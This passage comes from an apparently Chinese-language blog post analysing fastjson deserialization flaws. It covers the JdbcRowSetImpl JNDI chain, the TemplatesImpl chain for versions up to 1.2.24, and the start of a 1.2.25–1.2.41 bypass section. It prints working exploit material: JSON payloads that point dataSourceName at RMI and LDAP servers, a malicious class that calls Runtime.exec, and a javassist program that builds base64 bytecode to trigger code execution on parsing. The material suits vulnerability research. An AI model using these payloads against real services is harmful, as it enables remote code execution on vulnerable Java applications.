class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到setter；这个方法我们也可直接控制；传入一个参数；先去尝试拿到dataSource属性，如果其为空，则进入其父类中进行赋值；简单的追溯下其父类的逻辑</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">        dataSource = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       dataSource = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    URL = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接给父类中的dataSource赋值；然后get到其父类中的值；发现此属性我们可控，因为结合javabean模式(我更喜欢称之为模式，可以直接传入json将其赋值，然后调用的时候调用相应的getter直接造成jndi注入；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>触发jndi注入的另外一个关键点在setAutoCommit函数，不难发现；setAutoCommit函数也是满足之前分析的javabean模式的；方法名长度大于4且以set开头，且第四个字母要是大写；为非静态方法；返回类型为void或当前类；参数个数为1个；在函数里可以调用connect函数；所以总结出来，直接给出json；这里只是需要去调用autoCommit方法即可，其参数设置没有特殊要求；</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/#&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/#&quot;,&quot;autoCommit&quot;:false&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>原理其实不是很难，直接开启一个rmi服务，然后python开启个httpserver，直接进行攻击即可；在相应的httpserver目录下放入提前设置好的恶意class；直接进行加载导致rce；攻击载荷如下：</p>
<p>恶意java；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将其编译之后在其目录开启httpserver；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gpui1P"><img src="https://z3.ax1x.com/2021/04/26/gpui1P.png" alt="gpui1P.png"></a></p>
<h2 id="【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链"><a href="#【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链" class="headerlink" title="【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链"></a>【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链</h2><p>这个链也是比较常规的一个链，分析过CC链的都应该比较清楚，在CC链中，我们最后执行命令的地方就是在TemplatesImpl类下；利用其newInstance方法去直接实力化我们自己构造的恶意class从而达到命令执行的效果；那么在fastjson中也是可直接调用；</p>
<p>追溯下源码看看；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以明显的看到会调用_clas去执行newInstance方法进行实例化；反追溯一下函数触发点；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以清晰的看到在newTransformer函数中进行调用了getTransletInstance方法，继续回溯一下newTransfromer方法的触发点；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可看到触发点回到了getOutputProperties方法；</p>
<p>这时候就需要利用到fastjson的javabean特性了；根据上面的分析，之前就得到了getter自动调用的要求为；</p>
<p>长度大于4；不为static；以get开头，第四个字母为大写，没有参数；返回值类型继承于Map或者Collection类；或者AtomicBoolean，AtomicInteger，AtomicLong类；只有这样的getter才可被调用；</p>
<p>但是此处的函数返回类型为Properties类型，回溯一下Properties类；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Properties</span> <span class="keyword">extends</span> <span class="title">Hashtable</span>&lt;<span class="title">Object</span>,<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现其继承于Hashtable类，继续回溯一下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hashtable</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">Dictionary</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<p>这里Hashtable类继承了Map接口，所以Properties也是继承于Map接口的；满足条件，也就是这个方法可以在parse的时候直接被调用；所以就有了exp；之前的构造和CC链的构造是一样的；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">s1mple</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        ClassPool classpool = ClassPool.getDefault();</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));<span class="comment">//加入到路径中</span></span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        CtClass s2mple = classpool.get(s1mple.class.getName());<span class="comment">//拿到s1mple的class对象并将其写入到hashtable中；</span></span><br><span class="line">        CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());<span class="comment">//拿到AbstractTranslet的class对象并将其写入hashtalb中；</span></span><br><span class="line">        s2mple.setSuperclass(s3mple);<span class="comment">//设置父类；（过if）</span></span><br><span class="line">        s2mple.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bt = s2mple.toBytecode();</span><br><span class="line">        String base = Base64.getEncoder().encodeToString(bt);</span><br><span class="line">        System.out.println(base);</span><br><span class="line">        String a = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAJQoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZzMW1wbGUBAAxJbm5lckNsYXNzZXMBABFMZmFzdGpzb24kczFtcGxlOwEAClNvdXJjZUZpbGUBAA1mYXN0anNvbi5qYXZhDAAEAAUHABMBAA9mYXN0anNvbiRzMW1wbGUBABBqYXZhL2xhbmcvT2JqZWN0AQAIZmFzdGpzb24BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAUCgAVAA8BAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAYAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGgAbCgAZABwBAD0vU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAeAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAIAAhCgAZACIBAA1TdGFja01hcFRhYmxlACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABgAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAkAAMAAgAAAA+nAAMBTLgAHRIftgAjV7EAAAABACQAAAADAAEDAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=\&quot;],\&#x27;_name\&#x27;:\&#x27;a.b\&#x27;,\&#x27;_tfactory\&#x27;:&#123; &#125;,\&#x27;_outputProperties\&#x27;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">        Object s1mple = JSON.parseObject(a,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>理解了javabean也就不是很难理解这个json的调用机制，这里因为bytecodes为字节码文件，所以在传输的过程中应该会有种加密方法保证其可以完整传输，这里追溯下源码：</p>
<p>但是这里有个问题，是_bytecode的赋值问题；我们在相应的类中也没有发现什么和bytecode相关的setter；那么相应的值是怎么赋到里面？其实这个也不是很难，简单的调试一下就可以发现相应的问题；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gibhVO"><img src="https://z3.ax1x.com/2021/04/28/gibhVO.png" alt="gibhVO.png"></a></p>
<p>主要的问题点在这个地方，因为bytecode的值为字节码不是对象，所以这里过了很多的判断之后直接进行setValue去进行相应的赋值；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/giqCzn"><img src="https://z3.ax1x.com/2021/04/28/giqCzn.png" alt="giqCzn.png"></a></p>
<p>追溯过去可以看到直接就是给_bytecode直接赋值；但是一般的赋值无法利用成功，测试一下可以看到：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wodefuck</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[][] s1mple;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setByte</span><span class="params">(<span class="keyword">byte</span>[][] aa)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.s1mple = aa;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setA</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[][] getS1mple()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getS1mple()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s1mple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">readObject</span><span class="params">(ObjectInputStream is)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;readObject&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException </span>&#123;</span><br><span class="line">    wodefuck fuck = <span class="keyword">new</span> wodefuck();</span><br><span class="line">    fuck.setByte(<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;&#123;<span class="number">1</span>&#125;&#125;);</span><br><span class="line">    String json = JSON.toJSONString(fuck, SerializerFeature.WriteClassName);</span><br><span class="line">    System.out.println(json);</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">    <span class="comment">//    输出：</span></span><br><span class="line">    <span class="comment">//    getS1mple()</span></span><br><span class="line">    <span class="comment">//		&#123;&quot;@type&quot;:&quot;wodefuck&quot;,&quot;s1mple&quot;:[&quot;AQ==&quot;]&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的写个demo跑一下不难发现是输出的是base64编码；看来是对字节码做了base64加密，这里直接反序列化下json；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String json1  =<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;wodefuck\&quot;,\&quot;s1mple\&quot;:[\&quot;AQ==\&quot;]&#125;&quot;</span>;</span><br><span class="line">Object json2 = JSON.parseObject(json1);</span><br><span class="line">System.out.println(json2);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现其回显为</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;s1mple&quot;</span>:[[<span class="number">1</span>]]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以可以看到对字节流采取了base64解密的反json化；所以顺应其原理，将bytecode进行相应的base64加密，传入，直接反json化解析就可利用漏洞；所以上述的exp可以直接利用成功，进行攻击TemplatesImpl类达到rce的效果；另外还要写个点，json在反序列化的时候是会忽略不存在的属性的；int类型会直接赋值为0；因为测试后发现int类型下在fastjson中0和null有相同的效果；这是在复现的时候因为代码写错偶然发现的一个问题；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gkKRWF"><img src="https://z3.ax1x.com/2021/04/29/gkKRWF.png" alt="gkKRWF.png"></a></p>
<h1 id="fastjson历史之绕过方式"><a href="#fastjson历史之绕过方式" class="headerlink" title="fastjson历史之绕过方式"></a>fastjson历史之绕过方式</h1><h2 id="1-2-25-1-2-41补丁绕过"><a href="#1-2-25-1-2-41补丁绕过" class="headerlink" title="1.2.25-1.2.41补丁绕过"></a>1.2.25-1.2.41补丁绕过</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/badNameClass&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单追溯一下其历史就会发现其修补还是很有趣的；</p>
<p>在1.2.25中；DefaultJSONParser class下做出了一个改动；由原来的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="keyword">this</span>.config.getDefaultClassLoader());</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修改成了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = <span class="keyword">this</span>.config.checkAutoType(ref, (Class)<span class="keyword">null</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现其加上了一个check；追溯下这个方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span 